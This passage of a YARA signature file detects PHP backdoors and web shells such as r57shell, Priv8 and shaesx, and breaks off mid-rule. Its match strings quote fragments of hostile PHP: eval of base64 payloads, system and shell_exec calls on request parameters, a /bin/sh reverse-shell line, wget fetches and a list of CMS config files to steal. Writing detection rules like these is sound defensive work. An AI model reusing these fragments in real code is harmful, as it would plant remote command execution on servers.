rule php_backdoor_php_ajax_file_manager_001 : backdoor
{
    strings:
        $trigger = "exit(doRemoteCopy($path));"
    condition:
        $trigger and PR00203 and PR00205
}

rule php_backdoor_phpfm_001 : backdoor
{
    strings:
        $trigger = "$en['FileMan'] = 'PHP File Manager';"
    condition:
        $trigger
}

rule php_backdoor_phpfm_002 : backdoor
{
    strings:
        $trigger = "$et['en']['FileMan'] = 'PHP File Manager';"
    condition:
        $trigger
}

private rule PR02648 : trigger
{
    strings:
        $ps0 = "cookielife"
    condition:
        $ps0
}

rule php_backdoor_phpspyshell_001 : backdoor
{
    strings:
        $trigger = "$doing == 'downfile'"
    condition:
        $trigger and PR00013 and PR02648
}

private rule PR02649 : trigger
{
    strings:
        $ps0 = "\"phuploader\" style=\"margin: 0px; padding: 0px\""
    condition:
        $ps0
}

rule php_backdoor_phuploader_001 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR02649
}

rule php_backdoor_preg_replace_POST_001 : backdoor
{
    strings:
        $trigger = "chr(47) . $array[2] . chr(47) . chr(101),"
    condition:
        $trigger and PR00732
}

rule php_backdoor_preg_replace_POST_002 : backdoor
{
    strings:
        $trigger = "preg_replace(\"/./\\x65\",stripslashes(@$_POST["
    condition:
        $trigger
}

private rule PR02650 : trigger
{
    strings:
        $ps0 = "preg_replace(\"\\"
    condition:
        $ps0
}

rule php_backdoor_preg_replace_xor_002 : backdoor
{
    strings:
        $trigger = "\"^\""
    condition:
        $trigger and PR02650
}

private rule PR02651 : trigger
{
    strings:
        $ps0 = "$image = \"101 118 97 108"
    condition:
        $ps0
}

rule php_backdoor_pregreplace_009_02 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02651
}

private rule PR02652 : trigger
{
    strings:
        $ps0 = "@preg_replace('/(.*)/e', @$_REQUEST['"
    condition:
        $ps0
}

rule php_backdoor_pregreplace_015 : backdoor
{
    strings:
        $trigger = "isset($_REQUEST["
    condition:
        $trigger and PR02652
}

rule php_backdoor_pregreplace_016 : backdoor
{
    strings:
        $trigger = "<?php @preg_replace($_SERVER["
    condition:
        $trigger
}

private rule PR02653 : trigger
{
    strings:
        $ps0 = "=Array('' .'preg_repla' .'ce'); "
    condition:
        $ps0
}

rule php_backdoor_pregreplace_017 : backdoor
{
    strings:
        $trigger = "isset($_REQUEST["
    condition:
        $trigger and PR02653
}

rule php_backdoor_pregreplace_018 : backdoor
{
    strings:
        $trigger = "lgjqbj&3(6+;6y!$>::&%}\"!0|6&3(6+;6x%2$p}"
    condition:
        $trigger and PR00435
}

private rule PR02654 : trigger
{
    strings:
        $ps0 = "('//e',${\"_REQ"
    condition:
        $ps0
}

rule php_backdoor_pregreplace_019 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR02654
}

private rule PR02655 : trigger
{
    strings:
        $ps0 = "$_SERVER[HTTP_ACCEPT_ENCODING] =="
    condition:
        $ps0
}

private rule PR02656 : trigger
{
    strings:
        $ps0 = "\" ? @preg_filter(\""
    condition:
        $ps0
}

rule php_backdoor_pregreplace_020 : backdoor
{
    strings:
        $trigger = "\", $_SERVER[HTTP_ACCEPT_CHARSET], $"
    condition:
        $trigger and PR02655 and PR02656
}

private rule PR02657 : trigger
{
    strings:
        $ps0 = "$marker = \"cde:::\";"
    condition:
        $ps0
}

rule php_backdoor_pregreplace_021 : backdoor
{
    strings:
        $trigger = "function check_image_c()"
    condition:
        $trigger and PR02657 and PR01431
}

// MANUAL FIX NECESSARY
rule php_backdoor_pregreplace_022 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_pregreplace_022_r0 = /HTTP.1.1 404 Not Found[^;]+;[\s]*exit\(\);[\s]*\}[\s]*else[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*['\"\\]+p['\"\\]+[\s]*\.[\s]*['\"\\]+r['\"\\]+[\s]*\.[\s]*['\"\\]+e['\"\\]+[\s]*\.[\s]*['\"\\]+g['\"\\]+[\s]*\./
    condition:
        $trigger and $php_backdoor_pregreplace_022_r0
}

private rule PR02658 : trigger
{
    strings:
        $ps0 = "\"\\160\\162\\145\\147"
    condition:
        $ps0
}

private rule PR02659 : trigger
{
    strings:
        $ps0 = "\"\\163\\164\\162\\164\\162\";"
    condition:
        $ps0
}

private rule PR02660 : trigger
{
    strings:
        $ps0 = "$_SERVER['HTTP_SCHEME'];"
    condition:
        $ps0
}

rule php_backdoor_pregreplace_023 : backdoor
{
    strings:
        $trigger = "\"\\57\\56\\52\\57\\145\";"
    condition:
        $trigger and PR02658 and PR02659 and PR02660
}

// MANUAL FIX NECESSARY
rule php_backdoor_pregreplace_024 : backdoor
{
    strings:
        $trigger = "preg_"
        $php_backdoor_pregreplace_024_r0 = /<\?php[\s]*@?preg_replace\s*\(\s*[^,;]+\/[^,;]+\/e[^,;]+,\s*\$_/
    condition:
        $trigger and $php_backdoor_pregreplace_024_r0
}

private rule PR02661 : trigger
{
    strings:
        $ps0 = "$a(chr(46), $b($_POST["
    condition:
        $ps0
}

rule php_backdoor_pregreplace_030 : backdoor
{
    strings:
        $trigger = "]),0,chr(101));"
    condition:
        $trigger and PR02661
}

rule php_backdoor_priv8_001 : backdoor
{
    strings:
        $trigger = "Priv8-shell-coded-"
    condition:
        $trigger
}

rule php_backdoor_priv8_002 : backdoor
{
    strings:
        $trigger = "Shell Priv8</title>"
    condition:
        $trigger and PR00042
}

rule php_backdoor_priv8_003 : backdoor
{
    strings:
        $trigger = "DQppZihpc3NldCgkX0dFVFsibm9vYi"
    condition:
        $trigger and PR01398
}

private rule PR02662 : trigger
{
    strings:
        $ps0 = "$unhex = chr(hexdec($hex));"
    condition:
        $ps0
}

rule php_backdoor_priv8_004 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR02662
}

private rule PR02663 : trigger
{
    strings:
        $ps0 = "]}=array(\"wp-config.php\",\"wordpress/wp-config.php\",\"configuration.php\",\"blog/wp-config.php\",\"joomla/configuration.php\","
    condition:
        $ps0
}

rule php_backdoor_pro_shell_001 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02663 and PR00355 and PR00357
}

rule php_backdoor_ptemp_001 : backdoor
{
    strings:
        $trigger = "file_put_contents('_ptemp','<?php '."
    condition:
        $trigger
}

rule php_backdoor_r57shell_001_001 : backdoor
{
    strings:
        $trigger = "$name='r57';"
    condition:
        $trigger
}

rule php_backdoor_r57shell_001_002 : backdoor
{
    strings:
        $trigger = "/*  r57shell.php -"
    condition:
        $trigger
}

rule php_backdoor_r57shell_001_003 : backdoor
{
    strings:
        $trigger = "$r57=\"7b17W9tIsjj8f54n3"
    condition:
        $trigger
}

rule php_backdoor_r57shell_001_004 : backdoor
{
    strings:
        $trigger = "with md5, default is 'r57'"
    condition:
        $trigger
}

private rule PR02664 : trigger
{
    strings:
        $ps0 = "if(($_POST['cmd']"
    condition:
        $ps0
}

private rule PR02665 : trigger
{
    strings:
        $ps0 = "@chmod($_POST"
    condition:
        $ps0
}

rule php_backdoor_r57shell_002 : backdoor
{
    strings:
        $trigger = "r57"
    condition:
        $trigger and PR02664 and PR02665
}

private rule PR02666 : trigger
{
    strings:
        $ps0 = "aWYgKC"
    condition:
        $ps0
}

rule php_backdoor_r57shell_003 : backdoor
{
    strings:
        $trigger = "r57"
    condition:
        $trigger and PR02666
}

rule php_backdoor_r57shell_004 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('FJzHkqPatkU"
    condition:
        $trigger
}

rule php_backdoor_r57shell_006 : backdoor
{
    strings:
        $trigger = "jsNCj8+';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJ"
    condition:
        $trigger and PR01436
}

rule php_backdoor_r57shell_007 : backdoor
{
    strings:
        $trigger = "7f1rd9tIkiiKfvda/g8wRl0gqyiKT0mUTJXesmS9rJdl2d4ckARJWCTBAkhJ"
    condition:
        $trigger and PR00029 and PR01436
}

private rule PR02667 : trigger
{
    strings:
        $ps0 = "$auth"
    condition:
        $ps0
}

private rule PR02668 : trigger
{
    strings:
        $ps0 = "e(base64_decode('7f3pets60jCK/n7zPLkHRu23Ja0ly6IGj7E7nod4SGRbHpJ8"
    condition:
        $ps0
}

rule php_backdoor_r57shell_008 : backdoor
{
    strings:
        $trigger = "$pass"
    condition:
        $trigger and PR01436 and PR00029 and PR02667 and PR02668
}

rule php_backdoor_randomuploader_001 : backdoor
{
    strings:
        $trigger = "array(\"dwr\",\"temp\",\"htdata\",\"docs\",\"memory\",\"limits_data\","
    condition:
        $trigger and PR01421
}

rule php_backdoor_rcshell_001 : backdoor
{
    strings:
        $trigger = "\"SEARCH TABLES<br>COMMA (,) SEPARATED<br>LEAVE EMPTY FOR ALL\""
    condition:
        $trigger and PR00029
}

rule php_backdoor_register_tick_001 : backdoor
{
    strings:
        $trigger = "declare(ticks=1); @register_tick_function($ {'_POST'}/*"
    condition:
        $trigger
}

rule php_backdoor_register_tick_001_02 : backdoor
{
    strings:
        $trigger = "; @register_tick_function(${\"_POST\"}{"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR02669 : trigger
{
    strings:
        $ps0 = "('<?php '.$"
    condition:
        $ps0
}

rule php_backdoor_remote_execution_001 : backdoor
{
    strings:
        $trigger = "fwrit"
        $php_backdoor_remote_execution_001_r0 = /if\(\$\w+\s*\=\s*\$this->\w+\(\$_SERVER\)\)\{/
        $php_backdoor_remote_execution_001_r1 = /\$this->\w+\s*=\s*'create';/
    condition:
        $trigger and PR02669 and $php_backdoor_remote_execution_001_r0 and $php_backdoor_remote_execution_001_r1
}

private rule PR02670 : trigger
{
    strings:
        $ps0 = ".suspected'))"
    condition:
        $ps0
}

rule php_backdoor_rename_001 : backdoor
{
    strings:
        $trigger = "rename("
    condition:
        $trigger and PR00203 and PR02201 and PR02203 and PR00205 and PR02670
}

rule php_backdoor_rename_002 : backdoor
{
    strings:
        $trigger = "if (file_exists(\"../.htaccess\")) unlink (\"../.htaccess\");"
    condition:
        $trigger
}

private rule PR02671 : trigger
{
    strings:
        $ps0 = ".php.suspected\")) rename(\""
    condition:
        $ps0
}

rule php_backdoor_rename_003 : backdoor
{
    strings:
        $trigger = " = fread($file, filesize(\".."
    condition:
        $trigger and PR02671 and PR00203
}

rule php_backdoor_request_004 : backdoor
{
    strings:
        $trigger = "$_REQUEST[fun]($_REQUEST[id_polls"
    condition:
        $trigger
}

private rule PR02672 : trigger
{
    strings:
        $ps0 = "(stripslashes($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_request_005 : backdoor
{
    strings:
        $trigger = "'a'.'ss'.'ert'"
    condition:
        $trigger and PR02672
}

private rule PR02673 : trigger
{
    strings:
        $ps0 = "md5(@$_COOKIE"
    condition:
        $ps0
}

private rule PR02674 : trigger
{
    strings:
        $ps0 = "@$_(stripslashes"
    condition:
        $ps0
}

rule php_backdoor_request_006 : backdoor
{
    strings:
        $trigger = "@$_REQUEST["
    condition:
        $trigger and PR02673 and PR02674
}

private rule PR02675 : trigger
{
    strings:
        $ps0 = "array($_POST["
    condition:
        $ps0
}

private rule PR02676 : trigger
{
    strings:
        $ps0 = "array_walk($arr,"
    condition:
        $ps0
}

rule php_backdoor_request_007 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR02675 and PR02676
}

rule php_backdoor_request_008 : backdoor
{
    strings:
        $trigger = "${''.'_REQUEST'}; if (isset($"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_request_009 : backdoor
{
    strings:
        $trigger = "class Mage_"
        $php_backdoor_request_009_r0 = /if[\s]*\([\s]*@[\s]*\$_COOKIE[\s]*\[[\s]*.[\w]+.[\s]*\][\s]*\)[\s]*\([\s]*\$_[\s]*=[\s]*@[\s]*\$_REQUEST[\s]*\[.[\w]+.\][\s]*\).@[\s]*\$_[\s]*\([\s]*\$_REQUEST[\s]*\[.[\w]+.\][\s]*\);/
    condition:
        $trigger and $php_backdoor_request_009_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_request_010 : backdoor
{
    strings:
        $trigger = "REQUE"
        $php_backdoor_request_010_r0 = /\$_REQUEST\[\\"\w+\\"\].\?.\$_REQUEST\[\\"\w+\\"\]\(\$_REQUEST\[\\"\w+\\"\]\)/
    condition:
        $trigger and $php_backdoor_request_010_r0
}

private rule PR02677 : trigger
{
    strings:
        $ps0 = "['a']&&$_REQUEST['b']"
    condition:
        $ps0
}

rule php_backdoor_request_011 : backdoor
{
    strings:
        $trigger = "if ($_REQUEST['"
    condition:
        $trigger and PR02677
}

private rule PR02678 : trigger
{
    strings:
        $ps0 = "register_tick_function"
    condition:
        $ps0
}

rule php_backdoor_request_012 : backdoor
{
    strings:
        $trigger = ", base64_decode($_REQUEST['"
    condition:
        $trigger and PR01975 and PR02678
}

rule php_backdoor_request_013 : backdoor
{
    strings:
        $trigger = "=array(base64_decode($_POST['id']));$arr2=array(1);array_udiff($arr, $arr2,"
    condition:
        $trigger and PR01975
}

private rule PR02679 : trigger
{
    strings:
        $ps0 = "exec('wget ' . $url);"
    condition:
        $ps0
}

rule php_backdoor_request_014 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR02679
}

private rule PR02680 : trigger
{
    strings:
        $ps0 = "']('$_',$_REQUEST['"
    condition:
        $ps0
}

rule php_backdoor_request_015 : backdoor
{
    strings:
        $trigger = "(stripslashes($_REQUEST"
    condition:
        $trigger and PR02680
}

rule php_backdoor_request_016 : backdoor
{
    strings:
        $trigger = "$class = $this -> aes_decrypt($encrytion_block, $cryption_key);"
    condition:
        $trigger and PR00029 and PR01422 and PR01748
}

rule php_backdoor_request_017 : backdoor
{
    strings:
        $trigger = "${\"_REQUEST\"}[\""
    condition:
        $trigger and PR02609
}

private rule PR02681 : trigger
{
    strings:
        $ps0 = "mail(stripslashes"
    condition:
        $ps0
}

private rule PR02682 : trigger
{
    strings:
        $ps0 = "eval(str_rot13(base64_decode($toeval)));"
    condition:
        $ps0
}

rule php_backdoor_request_018 : backdoor
{
    strings:
        $trigger = "$toeval=$_REQUEST["
    condition:
        $trigger and PR02681 and PR02682
}

private rule PR02683 : trigger
{
    strings:
        $ps0 = "s_xnl .= \"7\";"
    condition:
        $ps0
}

private rule PR02684 : trigger
{
    strings:
        $ps0 = "tools_xnl($_REQUEST[\"k\"])){$"
    condition:
        $ps0
}

rule php_backdoor_request_019 : backdoor
{
    strings:
        $trigger = "isset("
    condition:
        $trigger and PR02683 and PR00029 and PR02684
}

private rule PR02685 : trigger
{
    strings:
        $ps0 = "ls_xnl .= \"e\";"
    condition:
        $ps0
}

rule php_backdoor_request_019_02 : backdoor
{
    strings:
        $trigger = "isset("
    condition:
        $trigger and PR00029 and PR02684 and PR02685
}

rule php_backdoor_request_019_03 : backdoor
{
    strings:
        $trigger = "$DFT_tools_xnl == $DET_tools_xnl($_REQUEST[\"k\"]))"
    condition:
        $trigger and PR00029 and PR02684 and PR01968
}

rule php_backdoor_request_020 : backdoor
{
    strings:
        $trigger = "=`{$_REQUEST['"
    condition:
        $trigger
}

private rule PR02686 : trigger
{
    strings:
        $ps0 = "base64_decode(rawurldecode((urlencode(urldecode($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_request_021 : backdoor
{
    strings:
        $trigger = "@require(stream_get_meta_data($"
    condition:
        $trigger and PR02686 and PR01379
}

rule php_backdoor_request_022 : backdoor
{
    strings:
        $trigger = "$res = $filter1('', $filter2($_REQUEST["
    condition:
        $trigger and PR01379
}

private rule PR02687 : trigger
{
    strings:
        $ps0 = "fwrite(fopen($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_request_023 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02687 and PR01382
}

// MANUAL FIX NECESSARY
rule php_backdoor_request_024 : backdoor
{
    strings:
        $trigger = "REQUE"
        $php_backdoor_request_024_r0 = /if[\s]*\([\s]*\$[\w]+[\s]*=[\s]*@\$[\s]*\{[\s]*._REQUEST.[\s]*\}[\s]*\[[\s]*.[\w]+.[\s]*\][\s]*\)/
    condition:
        $trigger and $php_backdoor_request_024_r0
}

private rule PR02688 : trigger
{
    strings:
        $ps0 = "stream_get_meta_data($"
    condition:
        $ps0
}

private rule PR02689 : trigger
{
    strings:
        $ps0 = "chr(ord("
    condition:
        $ps0
}

rule php_backdoor_request_025 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR02688 and PR01403 and PR02689
}

rule php_backdoor_request_026 : backdoor
{
    strings:
        $trigger = "@`$_REQUEST["
    condition:
        $trigger
}

private rule PR02690 : trigger
{
    strings:
        $ps0 = "]),0,chr("
    condition:
        $ps0
}

rule php_backdoor_request_027 : backdoor
{
    strings:
        $trigger = "($_REQUEST["
    condition:
        $trigger and PR02690
}

private rule PR02691 : trigger
{
    strings:
        $ps0 = "bW92ZV91cGxvYWRlZF9maWxl"
    condition:
        $ps0
}

private rule PR02692 : trigger
{
    strings:
        $ps0 = "md5(@$_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_request_028 : backdoor
{
    strings:
        $trigger = "chmod("
    condition:
        $trigger and PR02691 and PR01479 and PR02692
}

// MANUAL FIX NECESSARY
rule php_backdoor_request_029 : backdoor
{
    strings:
        $trigger = "\"_REQUEST\""
        $php_backdoor_request_029_r0 = /if\s*\(\s*\$\w+\s*=\s*\@\s*\$\s*\{\s*\\"_REQUEST\\"\s*\}\[\s*\\"\w+\\"\s*\]\s*[^\$]*\$\w+\[\s*\d\s*\]\s*\(\s*\$\s*\{\s*\$\w+\s*\[\s*\d+\s*\]\s*\}\s*\[\s*\d+\s*\]\s*,\s*\$\w+\s*\[\s*\d+\s*\]\s*\(\s*\$[^\n]*;/
    condition:
        $trigger and $php_backdoor_request_029_r0
}

private rule PR02693 : trigger
{
    strings:
        $ps0 = "current(array_keys($_REQUEST)),-2,1)) -"
    condition:
        $ps0
}

rule php_backdoor_request_keys_001 : backdoor
{
    strings:
        $trigger = "strrev(STR_PROGRESS_CONSTANT"
    condition:
        $trigger and PR02693
}

rule php_backdoor_request_keys_002 : backdoor
{
    strings:
        $trigger = "$SERVER_UNIQUE_LOAD_BALANCE(current"
    condition:
        $trigger and PR02693
}

private rule PR02694 : trigger
{
    strings:
        $ps0 = "$tr = @array_keys($_REQUEST)[0];"
    condition:
        $ps0
}

rule php_backdoor_request_keys_003_002 : backdoor
{
    strings:
        $trigger = "header('Location:"
    condition:
        $trigger and PR02694
}

private rule PR02695 : trigger
{
    strings:
        $ps0 = "naMseliF' = noitca_tluafed"
    condition:
        $ps0
}

private rule PR02696 : trigger
{
    strings:
        $ps0 = "ssap_htua"
    condition:
        $ps0
}

rule php_backdoor_reverseshell_001 : backdoor
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR02695 and PR02696
}

private rule PR02697 : trigger
{
    strings:
        $ps0 = "array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\")"
    condition:
        $ps0
}

rule php_backdoor_reverseshell_002 : backdoor
{
    strings:
        $trigger = "\"export TERM=xterm;PS1='\\$PWD>';export PS1;/bin/sh -i\""
    condition:
        $trigger and PR01837 and PR02697
}

private rule PR02698 : trigger
{
    strings:
        $ps0 = "ExecCGI"
    condition:
        $ps0
}

private rule PR02699 : trigger
{
    strings:
        $ps0 = "IyEvdXNyL2Jpbi9wZXJs"
    condition:
        $ps0
}

rule php_backdoor_reverseshell_003 : backdoor
{
    strings:
        $trigger = "chmod("
    condition:
        $trigger and PR02698 and PR02699 and PR01479
}

private rule PR02700 : trigger
{
    strings:
        $ps0 = "$shell"
    condition:
        $ps0
}

rule php_backdoor_reverseshell_004 : backdoor
{
    strings:
        $trigger = "fsockopen($ip, $port"
    condition:
        $trigger and PR02700
}

rule php_backdoor_rfi_001 : backdoor
{
    strings:
        $trigger = "system($_GET[\"a3kfj39f"
    condition:
        $trigger
}

private rule PR02701 : trigger
{
    strings:
        $ps0 = "private $_cms = null, $_path = null, $_init = null, $_site = null, $_cmstime = null,"
    condition:
        $ps0
}

rule php_backdoor_rssinit_001 : backdoor
{
    strings:
        $trigger = "config"
    condition:
        $trigger and PR02701
}

rule php_backdoor_Ru24PostWebShell_001 : backdoor
{
    strings:
        $trigger = "passthru; // system, exec, cmd"
    condition:
        $trigger
}

private rule PR02702 : trigger
{
    strings:
        $ps0 = "Command Shell</font></b><br>\";"
    condition:
        $ps0
}

rule php_backdoor_safe_mode_bypass_shell_001 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR02702
}

// MANUAL FIX NECESSARY
private rule PR02703 : trigger
{
    strings:
        $ps0 = "array_keys($_COOKIE)"
    condition:
        $ps0
}

rule php_backdoor_script_injection_013 : backdoor
{
    strings:
        $trigger = "chr(112).chr(114).chr(101).chr(103).chr(95).chr(109).chr(97).chr(116).chr(99).chr(104)"
        $php_backdoor_script_injection_013_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR01760 and PR02703 and $php_backdoor_script_injection_013_r0
}

private rule PR02704 : trigger
{
    strings:
        $ps0 = "gzuncompress(@$vlm(@sdec"
    condition:
        $ps0
}

rule php_backdoor_sdec_001 : backdoor
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR02704
}

rule php_backdoor_secwarshell_001 : backdoor
{
    strings:
        $trigger = "$action = '?action=FucK';"
    condition:
        $trigger
}

private rule PR02705 : trigger
{
    strings:
        $ps0 = "_shaesx_"
    condition:
        $ps0
}

private rule PR02706 : trigger
{
    strings:
        $ps0 = "include(\"{$eb}.$algo\");"
    condition:
        $ps0
}

rule php_backdoor_shaesx_001 : backdoor
{
    strings:
        $trigger = "@ini_set"
    condition:
        $trigger and PR02705 and PR02706 and PR01637
}

// MANUAL FIX NECESSARY
rule php_backdoor_shaesx_001_02 : backdoor
{
    strings:
        $trigger = "pack("
        $php_backdoor_shaesx_001_02_r0 = /error_reporting\([^;]*0[^;]*\);[\s]*(@ini_set[^;]+\);[\s]*){1,2}/
    condition:
        $trigger and PR02705 and PR02706 and $php_backdoor_shaesx_001_02_r0
}

rule php_backdoor_shaesx_002 : backdoor
{
    strings:
        $trigger = "(\"$apikey\"),"
    condition:
        $trigger and PR02705 and PR01637
}

private rule PR02707 : trigger
{
    strings:
        $ps0 = "(!$"
    condition:
        $ps0
}

private rule PR02708 : trigger
{
    strings:
        $ps0 = "unlink"
    condition:
        $ps0
}

rule php_backdoor_shaesx_003 : backdoor
{
    strings:
        $trigger = "checkClass"
    condition:
        $trigger and PR02705 and PR02707 and PR02708 and PR01637
}

rule php_backdoor_shaesx_004 : backdoor
{
    strings:
        $trigger = "$genpass"
    condition:
        $trigger and PR02705 and PR01637
}

rule php_backdoor_shaesx_005 : backdoor
{
    strings:
        $trigger = "isset($_REQUEST[\"test_url\"])"
    condition:
        $trigger and PR02705 and PR02706 and PR01637
}

rule php_backdoor_shaesx_006 : backdoor
{
    strings:
        $trigger = "str_replace('!$"
    condition:
        $trigger and PR02705 and PR01637
}

rule php_backdoor_shaesx_007 : backdoor
{
    strings:
        $trigger = "function wp_cd($fd"
    condition:
        $trigger and PR02705 and PR01637
}

// MANUAL FIX NECESSARY
private rule PR02709 : trigger
{
    strings:
        $ps0 = "global"
    condition:
        $ps0
}

rule php_backdoor_shaesx_008 : backdoor
{
    strings:
        $trigger = "pack("
        $php_backdoor_shaesx_008_r0 = /error_reporting\(0\);[\s]*global \$[\w]+;[\s]*\$[\w]+[\s]*=[\s]*._shaesx[^>]+\$len[\s]*>[^>]+unlink\(...eb...algo[^;]+\);[^\}]+\}[\s]*/
    condition:
        $trigger and PR02705 and PR02709 and $php_backdoor_shaesx_008_r0
}

private rule PR02710 : trigger
{
    strings:
        $ps0 = "if ($shema == 1) {"
    condition:
        $ps0
}

rule php_backdoor_shaesx_009 : backdoor
{
    strings:
        $trigger = "pack("
    condition:
        $trigger and PR02710 and PR02705 and PR02706
}

rule php_backdoor_shellexec_001_001 : backdoor
{
    strings:
        $trigger = "@system($x);exit;"
    condition:
        $trigger
}

rule php_backdoor_shellexec_001_002 : backdoor
{
    strings:
        $trigger = "(\"JHJlZiA9ICRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCiRrZ"
    condition:
        $trigger and PR00029
}

rule php_backdoor_shellexec_001_003 : backdoor
{
    strings:
        $trigger = "{@system("
    condition:
        $trigger
}

private rule PR02711 : trigger
{
    strings:
        $ps0 = "if(isset($_REQUEST['cmd'])){"
    condition:
        $ps0
}

rule php_backdoor_shellexec_001_004 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02711
}

rule php_backdoor_shellexec_002 : backdoor
{
    strings:
        $trigger = ";system($cmd);echo \"</pre>\";die;"
    condition:
        $trigger
}

rule php_backdoor_shellexec_003 : backdoor
{
    strings:
        $trigger = "echo 'DarkCrewFriends';"
    condition:
        $trigger
}

rule php_backdoor_shellexec_004 : backdoor
{
    strings:
        $trigger = "$cmd = \"grep -F 'Location:' $filename | rev | cut -f2"
    condition:
        $trigger and PR00013
}

rule php_backdoor_shellexec_005 : backdoor
{
    strings:
        $trigger = "= shell_exec2(\"pwd\", $_POST['verify']);"
    condition:
        $trigger and PR00029
}

rule php_backdoor_shellexec_006 : backdoor
{
    strings:
        $trigger = "])) echo @shell_exec(@base64_decode($_GET["
    condition:
        $trigger
}

rule php_backdoor_shellexec_007 : backdoor
{
    strings:
        $trigger = "shell_exec(\"$"
    condition:
        $trigger and PR02356 and PR01021
}

private rule PR02712 : trigger
{
    strings:
        $ps0 = "exec('crontab"
    condition:
        $ps0
}

private rule PR02713 : trigger
{
    strings:
        $ps0 = "exec('ps ax|grep"
    condition:
        $ps0
}

rule php_backdoor_shellexec_008 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR01021 and PR02712 and PR00013 and PR02713
}

private rule PR02714 : trigger
{
    strings:
        $ps0 = "trim(@file_get_contents('/proc/"
    condition:
        $ps0
}

private rule PR02715 : trigger
{
    strings:
        $ps0 = "shell_exec(\"ps a\")));"
    condition:
        $ps0
}

rule php_backdoor_shellexec_009 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR00355 and PR02714 and PR02715
}

private rule PR02716 : trigger
{
    strings:
        $ps0 = "exec($cmd, $stdout);"
    condition:
        $ps0
}

private rule PR02717 : trigger
{
    strings:
        $ps0 = "shell_exec($cmd));"
    condition:
        $ps0
}

rule php_backdoor_shellexec_010 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02716 and PR00355 and PR02717 and PR00357
}

rule php_backdoor_shellexec_011 : backdoor
{
    strings:
        $trigger = ">Shell info<"
    condition:
        $trigger
}

private rule PR02718 : trigger
{
    strings:
        $ps0 = ",$a);shell_exec('chmod 0777 /tmp/"
    condition:
        $ps0
}

rule php_backdoor_shellexec_012 : backdoor
{
    strings:
        $trigger = "<?php $a = file_get_contents('http://"
    condition:
        $trigger and PR02718
}

// MANUAL FIX NECESSARY
private rule PR02719 : trigger
{
    strings:
        $ps0 = "`$_"
    condition:
        $ps0
}

rule php_backdoor_shellexec_013 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_shellexec_013_r0 = /=`\$_POST\[[\w]+\]`/
    condition:
        $trigger and PR02719 and $php_backdoor_shellexec_013_r0
}

private rule PR02720 : trigger
{
    strings:
        $ps0 = "{var_dump(shell_exec('curl -qs"
    condition:
        $ps0
}

rule php_backdoor_shellexec_014 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02720
}

private rule PR02721 : trigger
{
    strings:
        $ps0 = "$_=\"\";$_=\"'\";$_=($_^chr"
    condition:
        $ps0
}

rule php_backdoor_shellexec_015 : backdoor
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR02721
}

private rule PR02722 : trigger
{
    strings:
        $ps0 = "updateCwd(response.cwd)"
    condition:
        $ps0
}

private rule PR02723 : trigger
{
    strings:
        $ps0 = "shell_exec($"
    condition:
        $ps0
}

rule php_backdoor_shellexec_016 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR02722 and PR01021 and PR02723
}

private rule PR02724 : trigger
{
    strings:
        $ps0 = "var_dump($"
    condition:
        $ps0
}

rule php_backdoor_shellexec_017 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR01021 and PR02692 and PR02724
}

rule php_backdoor_shellexec_018 : backdoor
{
    strings:
        $trigger = "LUnHEq24Ef2aqRnvLvlFXpFmznlc5AwiX"
    condition:
        $trigger and PR02205
}

rule php_backdoor_shellexec_019 : backdoor
{
    strings:
        $trigger = "echo shell_exec(base64_decode($"
    condition:
        $trigger
}

rule php_backdoor_shell_dropper_001 : backdoor
{
    strings:
        $trigger = "}else{echo \"SORRY KILLED\\n\";}"
    condition:
        $trigger and PR01479
}

rule php_backdoor_shell_dropper_002 : backdoor
{
    strings:
        $trigger = "($_REQUEST['xo'])"
    condition:
        $trigger and PR00092 and PR00029
}

rule php_backdoor_shell_dropper_005 : backdoor
{
    strings:
        $trigger = "JFVlWHBsb2lUID0gIlN5MUx6TkZRS3l6Tkw3RzJWMHN2c1lZdzlZcEx"
    condition:
        $trigger and PR01398
}

rule php_backdoor_shell_get_001 : backdoor
{
    strings:
        $trigger = "shell_get.php?"
    condition:
        $trigger and PR00732
}

private rule PR02725 : trigger
{
    strings:
        $ps0 = "){eval($_GET["
    condition:
        $ps0
}

rule php_backdoor_shell_get_002 : backdoor
{
    strings:
        $trigger = "if(substr(md5($"
    condition:
        $trigger and PR02725 and PR02586
}

private rule PR02726 : trigger
{
    strings:
        $ps0 = "// check if shell"
    condition:
